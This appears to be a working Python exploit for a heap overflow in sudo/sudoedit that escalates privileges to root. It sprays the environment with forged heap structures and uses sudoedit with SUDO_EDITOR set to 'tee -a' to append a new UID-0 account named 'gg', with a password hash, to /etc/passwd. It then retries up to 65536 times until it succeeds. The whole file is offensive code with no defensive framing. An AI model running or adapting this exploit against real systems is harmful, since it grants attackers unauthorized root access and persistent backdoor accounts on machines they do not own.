#!/usr/bin/python

import os
import subprocess
import sys
import resource
import select
import signal
from struct import pack, unpack
from ctypes import cdll, c_char_p, POINTER

SUDO_PATH = b"/usr/bin/sudo"  # can be used in execve by passing argv[0] as "sudoedit"

TEE_PATH = b"/usr/bin/tee"
PASSWD_PATH = b'/etc/passwd'
APPEND_CONTENT = b"gg:$5$a$gemgwVPxLx/tdtByhncd4joKlMRYQ3IVwdoBXPACCL2:0:0:gg:/root:/bin/bash\n";

# fake defaults object for finding offsets
# expect VSYSCALL permission is "r-x" on old Linux kernel
VSYSCALL_ADDR = 0xffffffffff600000
defaults_test_obj = [
	b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", b"\\", # defaults.next
	b"A"*8 + pack("<Q", VSYSCALL_ADDR+0x880) + # prev, var (use syscall for testing first)
	b"A"*0x20
]

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)

resource.setrlimit(resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))

def execve(filename, cargv, cenvp):
	libc.execve(filename, cargv, cenvp)

def spawn_raw(filename, cargv, cenvp):
	pid = os.fork()
	if pid:
		# parent
		_, exit_code = os.waitpid(pid, 0)
		return exit_code & 0xff7f # remove coredump flag
	else:
		# child
		execve(filename, cargv, cenvp)
		exit(0)

def spawn(filename, argv, envp):
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(envp))(*envp)
	# Note: error with backtrace is print to tty directly. cannot be piped or suppressd
	r, w = os.pipe()
	pid = os.fork()
	if not pid:
		# child
		os.close(r)
		os.dup2(w, 2)
		execve(filename, cargv, cenvp)
		exit(0)
	# parent
	os.close(w)
	# might occur deadlock in heap. kill it if timeout and set exit_code as 6
	# 0.5 second should be enough for execution
	sr, _, _ = select.select([ r ], [], [], 0.5)
	# timeout, assume dead lock in heap
	os.kill(pid, signal.SIGKILL)
	_, exit_code = os.waitpid(pid, 0)
	exit_code = 6
	
	r = os.fdopen(r, 'r')
	err = r.read()
	r.close()
	return exit_code & 0xff7f, err  # remove coredump flag

def create_env(offset_defaults, offset_first_userspec, offset_userspec):
	# offset_userspec
	# - 0 if only first userspec is enough
	# - -1 if only single userspec
	with open('/proc/sys/kernel/randomize_va_space') as f: has_aslr = int(f.read()) != 0
	if has_aslr:
		STACK_ADDR_PAGE = 0x7fffe5d35000
	else:
		STACK_ADDR_PAGE = 0x7fffffff1000  # for ASLR disabled

	SA = STACK_ADDR_PAGE

	ADDR_REFSTR = pack('<Q', SA+0x20) # ref string

	ADDR_PRIV_PREV = pack('<Q', SA+0x10)
	ADDR_CMND_PREV = pack('<Q', SA+0x18) # cmndspec
	ADDR_MEMBER_PREV = pack('<Q', SA+0x20)
	ADDR_USER_PREV = pack('<Q', SA+0x38)

	ADDR_DEF_VAR = pack('<Q', SA+0x10)
	ADDR_DEF_BINDING = pack('<Q', SA+0x30)

	OFFSET = 0x30 + 0x20
	ADDR_MEMBER = pack('<Q', SA+OFFSET)
	ADDR_USER = pack('<Q', SA+OFFSET+0x30)
	ADDR_CMND = pack('<Q', SA+OFFSET+0x60+0x30)
	ADDR_PRIV = pack('<Q', SA+OFFSET+0x60+0x30+0x60)

	epage = [
		b'A'*0x8 + # to not ending with 0x00
		
		# fake def->var chunk (get freed)
		b'\x21', b'', b'', b'', b'', b'', b'',
		ADDR_PRIV[:6], b'',  # pointer to privilege
		ADDR_CMND[:6], b'',  # pointer to cmndspec
		ADDR_MEMBER[:6], b'',  # pointer to member
		
		# fake def->binding (list head) (get freed)
		b'\x21', b'', b'', b'', b'', b'', b'',
		b'', b'', b'', b'', b'', b'', b'', b'', # members.first
		ADDR_USER[:6], b'', # members.last (unused, so use it for single userspec case)
		b'A'*0x8 + # pad
		
		# member chunk
		b'\x31', b'', b'', b'', b'', b'', b'', # chunk size
		b'A'*8 + # member.tqe_next (can be any)
		ADDR_MEMBER_PREV[:6], b'', # member.tqe_prev
		b'A'*8 + # member.name (can be any because this object is not freed)
		pack('<H', MATCH_ALL), b'',  # type, negated
		b'A'*0xc+ # padding
		
		# userspec chunk (get freed)
		b'\x61', b'', b'', b'', b'', b'', b'', # chunk metadata
		b'', b'', b'', b'', b'', b'', b'', b'', # entries.tqe_next
		b'A'*8 +  # entries.tqe_prev
		b'', b'', b'', b'', b'', b'', b'', b'', # users.tqh_first
		ADDR_MEMBER[:6]+b'', b'', # users.tqh_last
		b'', b'', b'', b'', b'', b'', b'', b'', # privileges.tqh_first
		ADDR_PRIV[:6]+b'', b'', # privileges.tqh_last
		b'', b'', b'', b'', b'', b'', b'', b'', # comments.stqh_first
		ADDR_MEMBER_PREV[:6], b'', # comments.stqh_last (can be any), file for <1.8.23
		b'A'*8 + # lineno (can be any)
		ADDR_MEMBER_PREV[:6], b'', # file (ref string)
		b'A'*8 + # padding
		
		# cmndspec chunk
		b'\x61', b'', b'', b'', b'', b'', b'', # chunk size
		#b'\x61'*0x8 + # chunk metadata (need only prev_inuse flag)
		b'A'*0x8 + # entries.tqe_next
		ADDR_CMND_PREV[:6], b'',  # entries.teq_prev
		b'', b'', b'', b'', b'', b'', b'', b'', # runasuserlist
		b'', b'', b'', b'', b'', b'', b'', b'', # runasgrouplist
		ADDR_MEMBER[:6], b'',  # cmnd
		b'\xf9'+b'\xff'*7 + # tag (NOPASSWD), timeout
		(b'' if sudo_ver < 20 else b'\xff'*0x10) + # notbefore, notafter
		(b'\xff'*8 if sudo_ver == 20 else b'') + # timeout for version 1.8.20
		b'', b'', b'', b'', b'', b'', b'', b'', # role
		b'', b'', b'', b'', b'', b'', b'', b'', # type
		(b'' if sudo_ver == 20 else b'A'*(0x18 if sudo_ver < 20 else 8)) + # padding
		
		# privileges chunk
		b'\x51'*0x8 + # chunk metadata
		b'A'*0x8 + # entries.tqe_next
		ADDR_PRIV_PREV[:6], b'',  # entries.teq_prev
		(b'A'*8 if has_ldap else b'') + # ldap_role
		b'A'*8 + # hostlist.tqh_first
		ADDR_MEMBER[:6], b'',  # hostlist.tqh_last
		b'A'*8 + # cmndlist.tqh_first
		ADDR_CMND[:6], b'',  # cmndlist.tqh_last
		b'', b'', b'', b'', b'', b'', b'', b'', # defaults.tqh_first
	]

	env = [ b'A'*(0x401f+0x108) ]
	if offset_defaults != -1:
		env[-1] += b'A'*(offset_defaults) + b'\x41\\'
		env.extend([
			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # chunk metadata
			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # next
			b'a'*8 + # prev
			ADDR_DEF_VAR[:6]+b'\\', b'\\', # var
			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # val
			ADDR_DEF_BINDING[:6]+b'\\', b'\\', # binding
			ADDR_REFSTR[:6]+b'\\', b'\\',  # file
			b"Z"*0x8+  # type, op, error, lineno
			b'\x31\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # next
		])
		offset_first_userspec -= 8
	
	chunk_size_byte = pack('B', userspec_chunk_size+1)
	tmp = b'A'*(offset_first_userspec) + chunk_size_byte + b'\\'
	if env[-1] == b'\\':
		env.append(tmp)
	else:
		env[-1] += tmp
	env.extend([ b'\\', b'\\', b'\\', b'\\', b'\\', b'\\' ]) # complete userspec chunk size

	if offset_userspec != 0:
		env.extend([
			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # entries.tqe_next
			b"A"*8 + # entries.tqe_prev
			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # users.tqh_first
			b"A"*8 + # users.tqh_last
			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # privileges.tqh_first
			b"A"*8 # privileges.tqh_last
		])
		if userspec_chunk_size == 0x60: # has comments
			env[-1] += '\\'
			env.extend([
				b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # comments.tqh_first
				b"A"*8 # comments.tqh_last
			])
		if userspec_chunk_size >= 0x50:
			env[-1] += b'A'*8 + ADDR_REFSTR[:6] + b'\\'
			env.append(b'\\')
			env.append(b'A'*8 + b'\x21\\')  # padding, chunk size
		else:
			env[-1] += b'A'*8 + b'\x21\\'  # padding, chunk size
		env.extend([
			b'\\', b'\\', b'\\', b'\\', b'\\', b'\\',  # need valid chunk metadata
			b'A'*(offset_userspec-userspec_chunk_size-8+8-1)+b'\\'
		])
		
	env.extend([
		# userspec chunk
		# for single userspec, sudo might pass checking and cause heap corruption when freeing
		#   stack memory (with all zero). this case is slower than other cases.
		# for >=2 userspecs, this chunk is not used because list is iterated with head->last->prev->next
		ADDR_USER[:6]+b'\\', b'\\', # entries.tqe_next
		ADDR_USER_PREV[:6]+b'\\', b'\\', # entries.tqe_prev
		b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', # users.tqh_first
		#ADDR_MEMBER[:6]+b'\\', b'\\', # users.tqh_last
		b'A'*8 + # users.tqh_last
		b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'\\', b'', # privileges.tqh_first
		b"LC_ALL=C",
		b"SUDO_EDITOR="+TEE_PATH+b" -a", # append stdin to /etc/passwd
		b"TZ=:",
	])
	
	# fill spray data
	cnt = sum(map(len, epage))
	padlen = 4096 - cnt - len(epage)
	epage.append(b'P'*(padlen-1))

	ENV_STACK_SIZE_MB = 4
	for i in range(ENV_STACK_SIZE_MB * 1024 // 4):
		env.extend(epage)

	# reserve space in last element for '/usr/bin/sudo' and padding
	env[-1] = env[-1][:-14-8]
	env.append(None)

	return env

def run_until_success(argv, env):
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(env))(*env)

	r, w = os.pipe()
	os.dup2(r, 0)
	w = os.fdopen(w, 'wb')
	w.write(APPEND_CONTENT)
	w.close()

	null_fd = os.open('/dev/null', os.O_RDWR)
	os.dup2(null_fd, 2)

	for i in range(65536):
		sys.stdout.write('%d\r' % i)
		if i % 8 == 0:
			sys.stdout.flush()
		exit_code = spawn_raw(SUDO_PATH, cargv, cenvp)
		if exit_code == 0:
			print("success at %d" % i)
			break
		if exit_code not in (6, 7, 11):
			print("invalid offset. exit code: %d" % exit_code)
			break

def main():
	cmnd_size = int(sys.argv[1], 0)
	offset_defaults = int(sys.argv[2], 0)
	offset_first_userspec = int(sys.argv[3], 0)
	offset_userspec = int(sys.argv[4], 0)

	argv = [ b"sudoedit", b"-A", b"-s", PASSWD_PATH, b"A"*(cmnd_size-0x10-len(PASSWD_PATH)-1)+b"\\", None ]

	env_prefix = [ b'A'*(7+0x4010+0x110) ]

	print('')
	print("cmnd size: 0x%x" % cmnd_size)
	offset_defaults_txt = -1 if offset_defaults == -1 else "0x%x" % offset_defaults
	print("offset to defaults: %s" % offset_defaults_txt)
	print("offset to first userspec: 0x%x" % offset_first_userspec)
	offset_userspec_txt = -1 if offset_userspec == -1 else "0x%x" % offset_userspec
	print("offset to userspec: %s" % offset_userspec_txt)

	env = create_env(offset_defaults, offset_first_userspec, offset_userspec)	
	run_until_success(argv, env)

if __name__ == "__main__":

	sudo_ver = 23
	MATCH_ALL = 284
	has_ldap = True
	userspec_chunk_size = 0x60
	main()
